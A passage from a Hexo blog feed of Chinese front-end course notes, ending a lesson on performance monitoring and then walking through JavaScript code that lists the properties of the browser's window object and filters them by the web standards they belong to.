非常好用，它是浏览器记录的性能数据，一般来说，我们用统一的代码把它上传到服务器端就够用了。</p><p>数据的展现部分就比较自由了，可以用不同的数据可视化方案来展现性能数据，没有一定之规。一般的数据监控平台，会提供报警机制，对性能来说，报警需求不是特别强烈，但是也可以设置一些条件，针对秒开率特别低的网页报警。</p><p>有了监控，再配合一定制度，就可以保障整个团队产出的性能了，要注意，性能不是一个静态的事情，指标需要不断优化，技术方案还需要不断随着技术发展迭代，制度、自动化工具也需要不断改进，最终的监控平台产品也不能不做新需求，所以性能应该成为一个团队的日常工作的一部分，持续进行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天我们学习了前端团队工程实施中的性能体系，首先我们介绍了总体思想：性能应该是基于业务和实际用户体验需求的一种工程实施，不是纯粹的技术游戏。</p><p>接下来我们分成四个步骤介绍了性能工程体系，首先介绍了现状评估和建立指标，建立指标应当从业务的角度考虑，接下来讲了技术方案设计，技术方案应当从整体角度，基于 Profiling 的结果分析来设计。</p><p>之后我们讲了实施，我们讲了工程实施的三个层次：纯管理、制度化、工程化，最后，我们讲了结果评估和线上监控，线上监控需要从数据采集和数据展现两个部分分别实现。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>34丨浏览器：整理所有API</title>
      <link href="/Blog/2019/01/30/relearn_FE/34%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E6%95%B4%E7%90%86%E6%89%80%E6%9C%89API/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/34%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E6%95%B4%E7%90%86%E6%89%80%E6%9C%89API/index/</url>
      
        <content type="html"><![CDATA[<p>浏览器的 API 数目繁多，我们在之前的课程中，已经一起学习了其中几个比较有体系的部分：比如之前讲到过的 DOM 和 CSSOM 等等。但是，如果你留意过，会发现我们讲到的 API 仍然是标准中非常小的一部分。</p><p>我们按照每个 API 所在的标准来分类。所以，我们用代码来反射浏览器环境中全局对象的属性，然后我们用 JavaScript 的 filter 方法来逐步过滤掉已知的属性。</p><p>接下来，我们整理 API 的方法如下：</p><ul><li>从 Window 的属性中，找到 API 名称；</li><li>查阅 MDN 或者 Google，找到 API 所在的标准；</li><li>阅读标准，手工或者用代码整理出标准中包含的 API；</li><li>用代码在 Window 的属性中过滤掉标准中涉及的 API。</li></ul><p>重复这个过程，我们可以找到所有的 API 对应的标准。首先我们先把前面已经讲过的 API 过滤掉。</p><h2 id="JavaScript-中规定的-API"><a href="#JavaScript-中规定的-API" class="headerlink" title="JavaScript 中规定的 API"></a>JavaScript 中规定的 API</h2><p>大部分的 API 属于 Window 对象（或者说全局对象），我们可以用反射来看一看现行浏览器中已经实现的 API，我这里使用 Mac 下的 Chrome 72.0.3626.121 版本。</p><p>我们首先调用 Object.getOwnPropertyNames(window)。在我的环境中，可以看到，共有 821 个属性。</p><p>这里包含了 JavaScript 标准规定的属性，我们做一下过滤：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> js = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    <span class="keyword">let</span> objects = [<span class="string">&quot;BigInt&quot;</span>, <span class="string">&quot;BigInt64Array&quot;</span>, <span class="string">&quot;BigUint64Array&quot;</span>, <span class="string">&quot;Infinity&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;undefined&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;isFinite&quot;</span>, <span class="string">&quot;isNaN&quot;</span>, <span class="string">&quot;parseFloat&quot;</span>, <span class="string">&quot;parseInt&quot;</span>, <span class="string">&quot;decodeURI&quot;</span>, <span class="string">&quot;decodeURIComponent&quot;</span>, <span class="string">&quot;encodeURI&quot;</span>, <span class="string">&quot;encodeURIComponent&quot;</span>, <span class="string">&quot;Array&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;RegExp&quot;</span>, <span class="string">&quot;Promise&quot;</span>, <span class="string">&quot;Proxy&quot;</span>, <span class="string">&quot;Map&quot;</span>, <span class="string">&quot;WeakMap&quot;</span>, <span class="string">&quot;Set&quot;</span>, <span class="string">&quot;WeakSet&quot;</span>, <span class="string">&quot;Function&quot;</span>, <span class="string">&quot;Boolean&quot;</span>, <span class="string">&quot;String&quot;</span>, <span class="string">&quot;Number&quot;</span>, <span class="string">&quot;Symbol&quot;</span>, <span class="string">&quot;Object&quot;</span>, <span class="string">&quot;Error&quot;</span>, <span class="string">&quot;EvalError&quot;</span>, <span class="string">&quot;RangeError&quot;</span>, <span class="string">&quot;ReferenceError&quot;</span>, <span class="string">&quot;SyntaxError&quot;</span>, <span class="string">&quot;TypeError&quot;</span>, <span class="string">&quot;URIError&quot;</span>, <span class="string">&quot;ArrayBuffer&quot;</span>, <span class="string">&quot;SharedArrayBuffer&quot;</span>, <span class="string">&quot;DataView&quot;</span>, <span class="string">&quot;Float32Array&quot;</span>, <span class="string">&quot;Float64Array&quot;</span>, <span class="string">&quot;Int8Array&quot;</span>, <span class="string">&quot;Int16Array&quot;</span>, <span class="string">&quot;Int32Array&quot;</span>, <span class="string">&quot;Uint8Array&quot;</span>, <span class="string">&quot;Uint16Array&quot;</span>, <span class="string">&quot;Uint32Array&quot;</span>, <span class="string">&quot;Uint8ClampedArray&quot;</span>, <span class="string">&quot;Atomics&quot;</span>, <span class="string">&quot;JSON&quot;</span>, <span class="string">&quot;Math&quot;</span>, <span class="string">&quot;Reflect&quot;</span>, <span class="string">&quot;escape&quot;</span>, <span class="string">&quot;unescape&quot;</span>];</span><br><span class="line">    objects.<span class="title function_">forEach</span>(<span class="function"><span class="params">o</span> =&gt;</span> js.<span class="title function_">add</span>(o));</span><br><span class="line">    <span class="keyword">let</span> names = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(<span class="variable language_">window</span>)</span><br><span class="line">    names = names.<span class="title function_">filter</span>(<span class="function"><span class="params">e</span> =&gt;</span> !js.<span class="title function_">has</span>(e));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DOM-中的元素构造器"><a href="#DOM-中的元素构造器" class="headerlink" title="DOM 中的元素构造器"></a>DOM 中的元素构造器</h2><p>接下来我们看看已经讲过的 DOM 部分，DOM 部分包含了 document 属性和一系列的构造器，我们可以用 JavaScript 的 prototype 来过滤构造器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">names = names.<span class="title function_">filter</span>( <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">        <span class="keyword">return</span> !(<span class="variable language_">window</span>[e].<span class="property"><span class="keyword">prototype</span></span> <span class="keyword">instanceof</span> <span class="title class_">Node</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">filter</span>( <span class="function"><span class="params">e</span> =&gt;</span> e != <span class="string">&quot;Node&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里我们把所有 Node 的子类都过滤掉，再把 Node 本身也过滤掉，这是非常大的一批了。</p><h2 id="Window-对象上的属性"><a href="#Window-对象上的属性" class="headerlink" title="Window 对象上的属性"></a>Window 对象上的属性</h2><p>接下来我们要找到 Window 对象的定义，我们在下面链接中可以找到。</p><ul><li><a href="https://html.spec.whatwg.org/#window">https://html.spec.whatwg.org/#window</a></li></ul><p>这里有一个 Window 接口，是使用 WebIDL 定义的，我们手工把其中的函数和属性整理出来，如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window,self,document,name,location,<span class="keyword">history</span>,customElements,locationbar,menubar, personalbar,scrollbars,statusbar,toolbar,status,<span class="keyword">close</span>,closed,<span class="keyword">stop</span>,focus, blur,frames,length,top,opener,parent,frameElement,<span class="keyword">open</span>,navigator,applicationCache,alert,<span class="keyword">confirm</span>,prompt,<span class="keyword">print</span>,postMessage</span><br></pre></td></tr></table></figure><p>接下来，我们编写代码，把这些函数和属性，从浏览器 Window 对象的属性中去掉，JavaScript 代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> names = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(<span class="variable language_">window</span>)</span><br><span class="line">    <span class="keyword">let</span> js = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    <span class="keyword">let</span> objects = [<span class="string">&quot;BigInt&quot;</span>, <span class="string">&quot;BigInt64Array&quot;</span>, <span class="string">&quot;BigUint64Array&quot;</span>, <span class="string">&quot;Infinity&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;undefined&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;isFinite&quot;</span>, <span class="string">&quot;isNaN&quot;</span>, <span class="string">&quot;parseFloat&quot;</span>, <span class="string">&quot;parseInt&quot;</span>, <span class="string">&quot;decodeURI&quot;</span>, <span class="string">&quot;decodeURIComponent&quot;</span>, <span class="string">&quot;encodeURI&quot;</span>, <span class="string">&quot;encodeURIComponent&quot;</span>, <span class="string">&quot;Array&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;RegExp&quot;</span>, <span class="string">&quot;Promise&quot;</span>, <span class="string">&quot;Proxy&quot;</span>, <span class="string">&quot;Map&quot;</span>, <span class="string">&quot;WeakMap&quot;</span>, <span class="string">&quot;Set&quot;</span>, <span class="string">&quot;WeakSet&quot;</span>, <span class="string">&quot;Function&quot;</span>, <span class="string">&quot;Boolean&quot;</span>, <span class="string">&quot;String&quot;</span>, <span class="string">&quot;Number&quot;</span>, <span class="string">&quot;Symbol&quot;</span>, <span class="string">&quot;Object&quot;</span>, <span class="string">&quot;Error&quot;</span>, <span class="string">&quot;EvalError&quot;</span>, <span class="string">&quot;RangeError&quot;</span>, <span class="string">&quot;ReferenceError&quot;</span>, <span class="string">&quot;SyntaxError&quot;</span>, <span class="string">&quot;TypeError&quot;</span>, <span class="string">&quot;URIError&quot;</span>, <span class="string">&quot;ArrayBuffer&quot;</span>, <span class="string">&quot;SharedArrayBuffer&quot;</span>, <span class="string">&quot;DataView&quot;</span>, <span class="string">&quot;Float32Array&quot;</span>, <span class="string">&quot;Float64Array&quot;</span>, <span class="string">&quot;Int8Array&quot;</span>, <span class="string">&quot;Int16Array&quot;</span>, <span class="string">&quot;Int32Array&quot;</span>, <span class="string">&quot;Uint8Array&quot;</span>, <span class="string">&quot;Uint16Array&quot;</span>, <span class="string">&quot;Uint32Array&quot;</span>, <span class="string">&quot;Uint8ClampedArray&quot;</span>, <span class="string">&quot;Atomics&quot;</span>, <span class="string">&quot;JSON&quot;</span>, <span class="string">&quot;Math&quot;</span>, <span class="string">&quot;Reflect&quot;</span>, <span class="string">&quot;escape&quot;</span>, <span class="string">&quot;unescape&quot;</span>];</span><br><span class="line">    objects.<span class="title function_">forEach</span>(<span class="function"><span class="params">o</span> =&gt;</span> js.<span class="title function_">add</span>(o));</span><br><span class="line">    names = names.<span class="title function_">filter</span>(<span class="function"><span class="params">e</span> =&gt;</span> !js.<span class="title function_">has</span>(e));</span><br><span class="line"></span><br><span class="line">    names = names.<span class="title function_">filter</span>( <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">            <span class="keyword">return</span> !(<span class="variable language_">window</span>[e].<span class="property"><span class="keyword">prototype</span></span> <span class="keyword">instanceof</span> <span class="title class_">Node</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).<span class="title function_">filter</span>( <span class="function"><span class="params">e</span> =&gt;</span> e != <span class="string">&quot;Node&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> windowprops = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    objects = [<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;history&quot;</span>, <span class="string">&quot;customElements&quot;</span>, <span class="string">&quot;locationbar&quot;</span>, <span class="string">&quot;menubar&quot;</span>, <span class="string">&quot; personalbar&quot;</span>, <span class="string">&quot;scrollbars&quot;</span>, <span class="string">&quot;statusbar&quot;</span>, <span class="string">&quot;toolbar&quot;</span>, <span class="string">&quot;status&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;closed&quot;</span>, <span class="string">&quot;stop&quot;</span>, <span class="string">&quot;focus&quot;</span>, <span class="string">&quot; blur&quot;</span>, <span class="string">&quot;frames&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;opener&quot;</span>, <span class="string">&quot;parent&quot;</span>, <span class="string">&quot;frameElement&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;navigator&quot;</span>, <span class="string">&quot;applicationCache&quot;</span>, <span class="string">&quot;alert&quot;</span>, <span class="string">&quot;confirm&quot;</span>, <span class="string">&quot;prompt&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;postMessage&quot;</span>, <span class="string">&quot;console&quot;</span>];</span><br><span class="line">    objects.<span class="title function_">forEach</span>(<span class="function"><span class="params">o</span> =&gt;</span> windowprops.<span class="title function_">add</span>(o));</span><br><span class="line">    names = names.<span class="title function_">filter</span>(<span class="function"><span class="params">e</span> =&gt;</span> !windowprops.<span class="title function_">has</span>(e));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还要过滤掉所有的事件，也就是 on 开头的属性。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names = names.<span class="built_in">filter</span>( <span class="function"><span class="params">e</span> =&gt;</span> !e.match(<span class="regexp">/^on/</span>))</span><br></pre></td></tr></table></figure><p>webkit 前缀的私有属性我们也过滤掉：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names = names.<span class="built_in">filter</span>( <span class="function"><span class="params">e</span> =&gt;</span> !e.match(<span class="regexp">/^webkit/</span>))</span><br></pre></td></tr></table></figure><p>除此之外，我们在 HTML 标准中还能找到所有的接口，这些我们也过滤掉：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">let interfaces = <span class="keyword">new</span> Set();</span><br><span class="line">objects = [<span class="string">&quot;ApplicationCache&quot;</span>, <span class="string">&quot;AudioTrack&quot;</span>, <span class="string">&quot;AudioTrackList&quot;</span>, <span class="string">&quot;BarProp&quot;</span>, <span class="string">&quot;BeforeUnloadEvent&quot;</span>, <span class="string">&quot;BroadcastChannel&quot;</span>, <span class="string">&quot;CanvasGradient&quot;</span>, <span class="string">&quot;CanvasPattern&quot;</span>, <span class="string">&quot;CanvasRenderingContext2D&quot;</span>, <span class="string">&quot;CloseEvent&quot;</span>, <span class="string">&quot;CustomElementRegistry&quot;</span>, <span class="string">&quot;DOMStringList&quot;</span>, <span class="string">&quot;DOMStringMap&quot;</span>, <span class="string">&quot;DataTransfer&quot;</span>, <span class="string">&quot;DataTransferItem&quot;</span>, <span class="string">&quot;DataTransferItemList&quot;</span>, <span class="string">&quot;DedicatedWorkerGlobalScope&quot;</span>, <span class="string">&quot;Document&quot;</span>, <span class="string">&quot;DragEvent&quot;</span>, <span class="string">&quot;ErrorEvent&quot;</span>, <span class="string">&quot;EventSource&quot;</span>, <span class="string">&quot;External&quot;</span>, <span class="string">&quot;FormDataEvent&quot;</span>, <span class="string">&quot;HTMLAllCollection&quot;</span>, <span class="string">&quot;HashChangeEvent&quot;</span>, <span class="string">&quot;History&quot;</span>, <span class="string">&quot;ImageBitmap&quot;</span>, <span class="string">&quot;ImageBitmapRenderingContext&quot;</span>, <span class="string">&quot;ImageData&quot;</span>, <span class="string">&quot;Location&quot;</span>, <span class="string">&quot;MediaError&quot;</span>, <span class="string">&quot;MessageChannel&quot;</span>, <span class="string">&quot;MessageEvent&quot;</span>, <span class="string">&quot;MessagePort&quot;</span>, <span class="string">&quot;MimeType&quot;</span>, <span class="string">&quot;MimeTypeArray&quot;</span>, <span class="string">&quot;Navigator&quot;</span>, <span class="string">&quot;OffscreenCanvas&quot;</span>, <span class="string">&quot;OffscreenCanvasRenderingContext2D&quot;</span>, <span class="string">&quot;PageTransitionEvent&quot;</span>, <span class="string">&quot;Path2D&quot;</span>, <span class="string">&quot;Plugin&quot;</span>, <span class="string">&quot;PluginArray&quot;</span>, <span class="string">&quot;PopStateEvent&quot;</span>, <span class="string">&quot;PromiseRejectionEvent&quot;</span>, <span class="string">&quot;RadioNodeList&quot;</span>, <span class="string">&quot;SharedWorker&quot;</span>, <span class="string">&quot;SharedWorkerGlobalScope&quot;</span>, <span class="string">&quot;Storage&quot;</span>, <span class="string">&quot;StorageEvent&quot;</span>, <span class="string">&quot;TextMetrics&quot;</span>, <span class="string">&quot;TextTrack&quot;</span>, <span class="string">&quot;TextTrackCue&quot;</span>, <span class="string">&quot;TextTrackCueList&quot;</span>, <span class="string">&quot;TextTrackList&quot;</span>, <span class="string">&quot;TimeRanges&quot;</span>, <span class="string">&quot;TrackEvent&quot;</span>, <span class="string">&quot;ValidityState&quot;</span>, <span class="string">&quot;VideoTrack&quot;</span>, <span class="string">&quot;VideoTrackList&quot;</span>, <span class="string">&quot;WebSocket&quot;</span>, <span class="string">&quot;Window&quot;</span>, <span class="string">&quot;Worker&quot;</span>, <span class="string">&quot;WorkerGlobalScope&quot;</span>, <span class="string">&quot;WorkerLocation&quot;</span>, <span class="string">&quot;WorkerNavigator&quot;</span>];</span><br><span class="line">objects.forEach(<span class="function"><span class="params">o</span> =&gt;</span> interfaces.add(o));</span><br><span class="line"></span><br><span class="line">names = names.<span class="built_in">filter</span>(<span class="function"><span class="params">e</span> =&gt;</span> !interfaces.has(e));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样过滤之后，我们已经过滤掉了所有的事件、Window 对象、JavaScript 全局对象和 DOM 相关的属性，但是，竟然还剩余了很多属性！你是不是很惊讶呢？好了，接下来我们才进入今天的正题。</p><h2 id="其它属性"><a href="#其它属性" class="headerlink" title="其它属性"></a>其它属性</h2><p>这些既不属于 Window 对象，又不属于 JavaScript 语言的 Global 对象的属性，它们究竟是什么呢？</p><p>我们可以一个一个来查看这些属性，来发现一些我们以前没有关注过的标准。</p><p>首先，我们要把过滤的代码做一下抽象，写成一个函数：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> filter<span class="constructor">Out(<span class="params">names</span>, <span class="params">props</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="constructor">Set()</span>;</span><br><span class="line">    props.<span class="keyword">for</span><span class="constructor">Each(<span class="params">o</span> =&gt; <span class="params">set</span>.<span class="params">add</span>(<span class="params">o</span>)</span>);</span><br><span class="line">    return names.filter(e =&gt; !set.has(e));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function filterOut(names, props) {<br>let set &#x3D; new Set();<br>props.forEach(o &#x3D;&gt; set.add(o));<br>return names.filter(e &#x3D;&gt; !set.has(e));<br>}</p><h3 id="ECMAScript-2018-Internationalization-API"><a href="#ECMAScript-2018-Internationalization-API" class="headerlink" title="ECMAScript 2018 Internationalization API"></a>ECMAScript 2018 Internationalization API</h3><p>在我的浏览器环境中，第一个属性是：Intl。</p><p>在我的浏览器环境中，第一个属性是：Intl。</p><p>总之，经过查阅，我发现，它属于 ECMA402 标准，这份标准是 JavaScript 的一个扩展，它包含了国际化相关的内容：</p><ul><li><a href="http://www.ecma-international.org/ecma-402/5.0/index.html#Title">http://www.ecma-international.org/ecma-402/5.0/index.html#Title</a></li></ul><p>ECMA402 中，只有一个全局属性 Intl，我们也把它过滤掉：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names = names.<span class="built_in">filter</span>(<span class="function"><span class="params">e</span> =&gt;</span> e != <span class="string">&quot;Intl&quot;</span>)</span><br></pre></td></tr></table></figure><p>再来看看还有什么属性。</p><h3 id="Streams-标准"><a href="#Streams-标准" class="headerlink" title="Streams 标准"></a>Streams 标准</h3><p>接下来我看到的属性是： ByteLengthQueuingStrategy。</p><p>同样经过查阅，它来自 WHATWG 的 Streams 标准：</p><ul><li><a href="https://streams.spec.whatwg.org/#blqs-class">https://streams.spec.whatwg.org/#blqs-class</a></li></ul><p>不过，跟 ECMA402 不同，Streams 标准中还有一些其它属性，这里我手工查阅了这份标准，并做了整理。</p><p>接下来，我们用代码把它们跟 ByteLengthQueuingStrategy 一起过滤掉：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">names</span> = filterOut(names, [<span class="string">&quot;ReadableStream&quot;</span>, <span class="string">&quot;ReadableStreamDefaultReader&quot;</span>, <span class="string">&quot;ReadableStreamBYOBReader&quot;</span>, <span class="string">&quot;ReadableStreamDefaultController&quot;</span>, <span class="string">&quot;ReadableByteStreamController&quot;</span>, <span class="string">&quot;ReadableStreamBYOBRequest&quot;</span>, <span class="string">&quot;WritableStream&quot;</span>, <span class="string">&quot;WritableStreamDefaultWriter&quot;</span>, <span class="string">&quot;WritableStreamDefaultController&quot;</span>, <span class="string">&quot;TransformStream&quot;</span>, <span class="string">&quot;TransformStreamDefaultController&quot;</span>, <span class="string">&quot;ByteLengthQueuingStrategy&quot;</span>, <span class="string">&quot;CountQueuingStrategy&quot;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>好了，过滤之后，又少了一些属性，我们继续往下看。</p><h2 id="WebGL"><a href="#WebGL" class="headerlink" title="WebGL"></a>WebGL</h2><p>接下来我看到的属性是：WebGLContextEvent。</p><p>显然，这个属性来自 WebGL 标准：</p><ul><li><a href="https://www.khronos.org/registry/webgl/specs/latest/1.0/#5.15">https://www.khronos.org/registry/webgl/specs/latest/1.0/#5.15</a></li></ul><p>我们在这份标准中找到了一些别的属性，我们把它一起过滤掉：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">names</span> = filterOut(names, [<span class="string">&quot;WebGLContextEvent&quot;</span>,<span class="string">&quot;WebGLObject&quot;</span>, <span class="string">&quot;WebGLBuffer&quot;</span>, <span class="string">&quot;WebGLFramebuffer&quot;</span>, <span class="string">&quot;WebGLProgram&quot;</span>, <span class="string">&quot;WebGLRenderbuffer&quot;</span>, <span class="string">&quot;WebGLShader&quot;</span>, <span class="string">&quot;WebGLTexture&quot;</span>, <span class="string">&quot;WebGLUniformLocation&quot;</span>, <span class="string">&quot;WebGLActiveInfo&quot;</span>, <span class="string">&quot;WebGLShaderPrecisionFormat&quot;</span>, <span class="string">&quot;WebGLRenderingContext&quot;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>过滤掉 WebGL，我们继续往下看。</p><h2 id="Web-Audio-API"><a href="#Web-Audio-API" class="headerlink" title="Web Audio API"></a>Web Audio API</h2><p>下一个属性是 WaveShaperNode。这个属性名听起来就跟声音有关，这个属性来自 W3C 的 Web Audio API 标准。</p><p>我们来看一下标准：</p><ul><li><a href="https://www.w3.org/TR/webaudio/">https://www.w3.org/TR/webaudio/</a></li></ul><p><a href="https://www.w3.org/TR/webaudio/">https://www.w3.org/TR/webaudio/</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[<span class="string">&quot;AudioContext&quot;</span>, <span class="string">&quot;AudioNode&quot;</span>, <span class="string">&quot;AnalyserNode&quot;</span>, <span class="string">&quot;AudioBuffer&quot;</span>, <span class="string">&quot;AudioBufferSourceNode&quot;</span>, <span class="string">&quot;AudioDestinationNode&quot;</span>, <span class="string">&quot;AudioParam&quot;</span>, <span class="string">&quot;AudioListener&quot;</span>, <span class="string">&quot;AudioWorklet&quot;</span>, <span class="string">&quot;AudioWorkletGlobalScope&quot;</span>, <span class="string">&quot;AudioWorkletNode&quot;</span>, <span class="string">&quot;AudioWorkletProcessor&quot;</span>, <span class="string">&quot;BiquadFilterNode&quot;</span>, <span class="string">&quot;ChannelMergerNode&quot;</span>, <span class="string">&quot;ChannelSplitterNode&quot;</span>, <span class="string">&quot;ConstantSourceNode&quot;</span>, <span class="string">&quot;ConvolverNode&quot;</span>, <span class="string">&quot;DelayNode&quot;</span>, <span class="string">&quot;DynamicsCompressorNode&quot;</span>, <span class="string">&quot;GainNode&quot;</span>, <span class="string">&quot;IIRFilterNode&quot;</span>, <span class="string">&quot;MediaElementAudioSourceNode&quot;</span>, <span class="string">&quot;MediaStreamAudioSourceNode&quot;</span>, <span class="string">&quot;MediaStreamTrackAudioSourceNode&quot;</span>, <span class="string">&quot;MediaStreamAudioDestinationNode&quot;</span>, <span class="string">&quot;PannerNode&quot;</span>, <span class="string">&quot;PeriodicWave&quot;</span>, <span class="string">&quot;OscillatorNode&quot;</span>, <span class="string">&quot;StereoPannerNode&quot;</span>, <span class="string">&quot;WaveShaperNode&quot;</span>, <span class="string">&quot;ScriptProcessorNode&quot;</span>, <span class="string">&quot;AudioProcessingEvent&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>于是我们把它们也过滤掉：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">names</span> = filterOut(names, [<span class="string">&quot;AudioContext&quot;</span>, <span class="string">&quot;AudioNode&quot;</span>, <span class="string">&quot;AnalyserNode&quot;</span>, <span class="string">&quot;AudioBuffer&quot;</span>, <span class="string">&quot;AudioBufferSourceNode&quot;</span>, <span class="string">&quot;AudioDestinationNode&quot;</span>, <span class="string">&quot;AudioParam&quot;</span>, <span class="string">&quot;AudioListener&quot;</span>, <span class="string">&quot;AudioWorklet&quot;</span>, <span class="string">&quot;AudioWorkletGlobalScope&quot;</span>, <span class="string">&quot;AudioWorkletNode&quot;</span>, <span class="string">&quot;AudioWorkletProcessor&quot;</span>, <span class="string">&quot;BiquadFilterNode&quot;</span>, <span class="string">&quot;ChannelMergerNode&quot;</span>, <span class="string">&quot;ChannelSplitterNode&quot;</span>, <span class="string">&quot;ConstantSourceNode&quot;</span>, <span class="string">&quot;ConvolverNode&quot;</span>, <span class="string">&quot;DelayNode&quot;</span>, <span class="string">&quot;DynamicsCompressorNode&quot;</span>, <span class="string">&quot;GainNode&quot;</span>, <span class="string">&quot;IIRFilterNode&quot;</span>, <span class="string">&quot;MediaElementAudioSourceNode&quot;</span>, <span class="string">&quot;MediaStreamAudioSourceNode&quot;</span>, <span class="string">&quot;MediaStreamTrackAudioSourceNode&quot;</span>, <span class="string">&quot;MediaStreamAudioDestinationNode&quot;</span>, <span class="string">&quot;PannerNode&quot;</span>, <span class="string">&quot;PeriodicWave&quot;</span>, <span class="string">&quot;OscillatorNode&quot;</span>, <span class="string">&quot;StereoPannerNode&quot;</span>, <span class="string">&quot;WaveShaperNode&quot;</span>, <span class="string">&quot;ScriptProcessorNode&quot;</span>, <span class="string">&quot;AudioProcessingEvent&quot;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>我们继续看下一个属性。</p><h2 id="Encoding-标准"><a href="#Encoding-标准" class="headerlink" title="Encoding 标准"></a>Encoding 标准</h2><p>在我的环境中，下一个属性是 TextDecoder，经过查阅得知，这个属性也来自一份 WHATWG 的标准，Encoding：</p><ul><li><a href="https://encoding.spec.whatwg.org/#dom-textencoder">https://encoding.spec.whatwg.org/#dom-textencoder</a></li></ul><p>这份标准仅仅包含四个接口，我们把它们过滤掉：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">names</span> = filterOut(names, [<span class="string">&quot;TextDecoder&quot;</span>, <span class="string">&quot;TextEncoder&quot;</span>, <span class="string">&quot;TextDecoderStream&quot;</span>, <span 